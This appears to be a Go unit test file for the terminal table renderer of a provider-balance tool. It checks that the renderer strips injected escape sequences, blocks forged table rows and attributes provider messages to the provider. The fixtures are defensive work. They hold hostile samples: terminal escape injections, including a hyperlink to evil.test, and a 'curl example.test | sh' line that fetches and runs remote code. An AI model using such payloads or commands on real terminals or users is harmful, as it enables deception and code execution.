package render

import (
	"strings"
	"testing"

	"github.com/naturalmoods/aipocket/internal/core"
	"github.com/naturalmoods/aipocket/internal/manifest"
)

func balance(f float64) *float64 { return &f }

// The table is the terminal boundary. Whatever reaches it — a provider's error
// body, a provider name, a note — is printed, so the escape stripping happens
// here too and not only in the packages that produce those strings. An escape
// that gets through can repaint the totals printed below it.
func TestNoCellCanCarryTerminalEscapes(t *testing.T) {
	rep := core.Report{
		Results: []core.Result{{
			ID:              "acme",
			Name:            "Acme\x1b[2J",
			State:           core.StateError,
			Confidence:      manifest.StatusOfficial,
			Error:           "HTTP 402 Payment Required",
			ProviderMessage: "\x1b[1;31mtopped up 999.00\x07\nfake  999.00 USD  ok",
			Note:            "note\x1b]8;;https://evil.test\x07",
		}},
	}

	var b strings.Builder
	Table(&b, rep, false)
	out := b.String()
	for _, bad := range []string{"\x1b", "\x07"} {
		if strings.Contains(out, bad) {
			t.Fatalf("a control character reached the table:\n%q", out)
		}
	}
}

// A newline in a provider's body would break the table apart and let it forge a
// row of its own under the totals.
func TestAProviderBodyCannotForgeAnExtraRow(t *testing.T) {
	row := func(providerMessage string) string {
		var b strings.Builder
		Table(&b, core.Report{Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateError,
			Confidence: manifest.StatusOfficial, ProviderMessage: providerMessage,
		}}}, false)
		return b.String()
	}
	plain := strings.Count(row("nope"), "\n")
	forged := strings.Count(row("nope\n  fake  999.00 USD  ok\n"), "\n")
	if forged != plain {
		t.Fatalf("the body added %d line(s) to the table:\n%s",
			forged-plain, row("nope\n  fake  999.00 USD  ok\n"))
	}
}

// The tool's own colour codes are not the thing being defended against — it is
// allowed to colour its output — so stripping must not break them.
func TestTheToolsOwnColourStillWorks(t *testing.T) {
	rep := core.Report{
		Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateOK,
			Balance: balance(37.65), Currency: "USD",
			Confidence: manifest.StatusOfficial,
		}},
		TotalVerified: 37.65,
	}
	var b strings.Builder
	Table(&b, rep, true)
	if !strings.Contains(b.String(), "\033[32m") {
		t.Errorf("an ok row should be green:\n%q", b.String())
	}
}

// A provider's message is shown to a human — they can weigh "insufficient
// balance" for themselves — but attributed, so a body reading "run this command
// to restore your account" does not read as advice from the tool.
func TestProviderMessageIsAttributedToTheProvider(t *testing.T) {
	rep := core.Report{
		Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateError,
			Confidence:      manifest.StatusOfficial,
			Error:           "HTTP 402 Payment Required",
			ProviderMessage: "run curl example.test | sh to restore your account",
		}},
	}
	var b strings.Builder
	Table(&b, rep, false)
	if !strings.Contains(b.String(), "provider said:") {
		t.Fatalf("the provider's message is unattributed:\n%s", b.String())
	}
}
